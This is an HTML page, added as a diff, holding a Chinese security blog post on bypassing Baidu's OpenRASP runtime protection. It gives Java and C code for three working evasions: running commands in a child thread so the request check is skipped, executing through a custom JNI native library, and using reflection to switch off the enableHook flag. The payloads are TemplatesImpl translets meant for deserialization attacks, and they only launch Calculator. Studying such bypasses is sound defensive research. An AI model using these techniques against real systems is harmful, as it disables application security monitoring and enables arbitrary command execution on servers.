@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      OpenRASP bypass 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/notebook/">
+          <a href="/notebook/">学习笔记</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">OpenRASP bypass</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-01-11 20:54:18
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="OpenRasp-bypass"><a href="#OpenRasp-bypass" class="headerlink" title="OpenRasp bypass"></a>OpenRasp bypass</h1><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><a target="_blank" rel="noopener" href="https://github.com/baidu/openrasp/releases">https://github.com/baidu/openrasp/releases</a> 中下载最新版压缩包，起一个简单的<code>SpringBoot</code>项目后讲<code>rasp/rasp.jar</code>添加至<code>JVM</code>选项中启动即可</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251217143053-uk3eeep.png" alt="image-20251217143053-uk3eeep"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251217143145-uel9saa.png" alt="image-20251217143145-uel9saa"></p>
+<p>‍</p>
+<h3 id="子线程绕过"><a href="#子线程绕过" class="headerlink" title="子线程绕过"></a>子线程绕过</h3><p><code>rasp</code>的工作原理是<code>hook</code>函数，常见的命令执行如<code>Runtime.getRuntime.exec(command) , ProcessBuilder.start()</code>，<code>Runtime.getRuntime.exec()</code>的底层逻辑是<code>ProcessBuilder.start()</code>，而<code>ProcessBuilder.start()</code>中执行命令调用的是<code>ProcessImpl.start()</code>，故<code>openrasp</code>选择<code>hook</code> <code>ProcessImpl.start()</code>​</p>
+<p><code>ProcessImpl.start()</code>更底层调用的是<code>UNIXProcess</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251217145150-whjp78t.png" alt="image-20251217145150-whjp78t"></p>
+<p>故<code>openrasp</code>也<code>hook</code>了<code>UNIXProcess</code>。</p>
+<p>‍</p>
+<p>方法为<code>com.baidu.openrasp.hook.system.ProcessBuilderHook#hookMethod</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (ctClass.getName().contains(<span class="string">&quot;ProcessImpl&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (OSUtil.isWindows()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="built_in">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class, String.class&#125;);</span><br><span class="line">                <span class="built_in">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="literal">null</span>, src);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isModularityJdk()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="built_in">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2,$4&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class&#125;);</span><br><span class="line">                <span class="built_in">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="literal">null</span>, src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctClass.getName().contains(<span class="string">&quot;UNIXProcess&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="built_in">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2,$4&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class&#125;);</span><br><span class="line">            <span class="built_in">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="literal">null</span>, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><code>official.js</code>为<code>openrasp</code>的规则配置文件，对于命令注入&#x2F;命令执行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 v0.31 开始，当命令执行来自非HTTP请求的，我们也会检测反序列化攻击</span></span><br><span class="line"><span class="comment">// 但是不应该拦截正常的命令执行，所以这里加一个 context.url 检查</span></span><br><span class="line"><span class="keyword">if</span> (! context.<span class="property">url</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clean</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法2: 检测命令注入，或者命令执行后门</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">command_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">     ......</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在检测前先对<code>context.url</code>进行了判断，只要<code>context.url</code>为<code>null</code>就可以直接放行。</p>
+<p>使用场景之一是，利用反序列化漏洞创建一个子线程进行命令执行</p>
+<p>以<code>TemplatesImpl</code>为例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRasp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BypassRasp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="built_in">this</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;Calculator&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251217160858-yxaxy0q.png" alt="image-20251217160858-yxaxy0q"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251217160941-gq6l5f5.png" alt="image-20251217160941-gq6l5f5"></p>
+<p>‍</p>
+<p>在更严格的企业级<code>rasp</code>肯定已经被修了，而且<code>rasp</code>通常带有对反序列化链子危险类的检测，所以相对鸡肋。</p>
+<p>‍</p>
+<h3 id="JNI绕过"><a href="#JNI绕过" class="headerlink" title="JNI绕过"></a>JNI绕过</h3><p>参考 <a target="_blank" rel="noopener" href="http://www.bmth666.cn/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/index.html">http://www.bmth666.cn/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/index.html</a></p>
+<p>但是上文是针对<code>tomcat</code>环境的，不够通用，经过调试，发现是可以和<code>java</code>反序列化漏洞配合使用的</p>
+<p><code>rasp</code>对<code>java</code>底层的命令执行函数进行了<code>hook</code>，可以找更底层的，即<code>C</code>代码，可以通过加载<code>DLL/so/dylink</code>来自定义一个命令执行函数，绕过<code>rasp</code>的<code>hook</code>，比较像<code>Mysql</code>的<code>UDF</code>提权。</p>
+<p>‍</p>
+<p><code>JVM</code>在加载<code>native</code>库 (如<code>DLL/so/dylib</code>) 时，不会读取<code>Java</code>源码&#x2F;<code>class</code>文件来查找方法对应关系，而是根据<code>Java</code>方法的全限定信息，拼出一个标准的<code>C</code>函数名，然后在动态库中查找该符号。若找不到，则会抛出<code>UnsatisfieldLinkError: ...</code>异常。</p>
+<p>对于一个<code>Java native</code>方法，如 <code>public native void exec(String command)</code>​</p>
+<p>对应的<code>C</code>函数名的格式应该如 <code>Java_类名_方法名</code>​</p>
+<p>‍</p>
+<p><code>BypassRasp2.java</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRasp2</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BypassRasp2</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/tmp/libexec.dylib&quot;</span>);</span><br><span class="line">        exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的<code>.c</code>代码，对应的函数名为<code>Java_BypassRasp2_exec</code>​</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_BypassRasp2_exec</span><span class="params">(JNIEnv *env, jobject obj, jstring cmd)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *command = (*env)-&gt;GetStringUTFChars(env, cmd, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!command) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *fp = popen(command, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        (*env)-&gt;ReleaseStringUTFChars(env, cmd, command);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">char</span> result[<span class="number">8192</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> current_len = <span class="built_in">strlen</span>(result);</span><br><span class="line">        <span class="type">size_t</span> remaining = <span class="keyword">sizeof</span>(result) - current_len - <span class="number">1</span>; <span class="comment">// 留出 \0</span></span><br><span class="line">        <span class="keyword">if</span> (remaining &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">strncat</span>(result, buffer, remaining);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, cmd, command);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>.c</code>编译成目标系统对应架构的动态链接库文件即可。</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218105451-d1tlatn.png" alt="image-20251218105451-d1tlatn"></p>
+<p>利用的前提条件是绕过了<code>rasp</code>对反序列化漏洞的检测并且可以上传动态链接库文件至目标服务器中。</p>
+<p>‍</p>
+<h3 id="反射关闭hook绕过"><a href="#反射关闭hook绕过" class="headerlink" title="反射关闭hook绕过"></a>反射关闭hook绕过</h3><p>以命令执行为例，在<code>hook</code>危险函数前，<code>openrasp</code>走到<code>com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</code>方法，首先会进行<code>if</code>判断</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218171142-maiu1ty.png" alt="image-20251218171142-maiu1ty"></p>
+<p><img src="/assets/image-20251218171201-0yk3o0z.png" alt="image"></p>
+<p><code>enableHook</code>为<code>static final</code>修饰，正常反射无法修改其值，但是可以反射调用<code>AtomicBoolean</code>类中的<code>set</code>方法修改</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218171201-0yk3o0z.png" alt="image-20251218171201-0yk3o0z"></p>
+<p>‍</p>
+<p><code>BypassRasp3.java</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRasp3</span>  <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BypassRasp3</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">used</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">            used.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">enableHook</span> <span class="operator">=</span> used.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setMethod</span> <span class="operator">=</span> AtomicBoolean.class.getDeclaredMethod(<span class="string">&quot;set&quot;</span>,<span class="type">boolean</span>.class);</span><br><span class="line">            setMethod.invoke(enableHook,<span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关闭<code>hook</code>开关之后可以执行任意命令</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218171546-3ke1y29.png" alt="image-20251218171546-3ke1y29"></p>
+<p>‍</p>
+<p>除<code>enableHook</code>外，还可利用<code>disableHooks</code>参数</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218175648-7tgqs8b.png" alt="image-20251218175648-7tgqs8b"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251218175705-eh7e09b.png" alt="image"></p>
+<p>与<code>enableHook</code>同理</p>
+<p>‍ </p>
+<p>‍</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://packages.baidu.com/app/openrasp/release/">https://packages.baidu.com/app/openrasp/release/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/baidu/openrasp/releases">https://github.com/baidu/openrasp/releases</a></p>
+<p><a href="https://kagty1.github.io/2025/08/07/RASP/">https://kagty1.github.io/2025/08/07/RASP/</a></p>
+<p><a target="_blank" rel="noopener" href="https://g1asssy.com/2023/06/11/rasp_tricks/?ref=deep-kondah.com">https://g1asssy.com/2023/06/11/rasp_tricks/?ref=deep-kondah.com</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-01-11 20:54:18
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenRasp-bypass"><span class="toc-text">OpenRasp bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87"><span class="toc-text">子线程绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNI%E7%BB%95%E8%BF%87"><span class="toc-text">JNI绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%85%B3%E9%97%ADhook%E7%BB%95%E8%BF%87"><span class="toc-text">反射关闭hook绕过</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + OpenRASP%20bypass + '&url=' + http%3A%2F%2Fkagty1.github.io%2Fnotebook_posts%2FOpenRasp%2520bypass.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
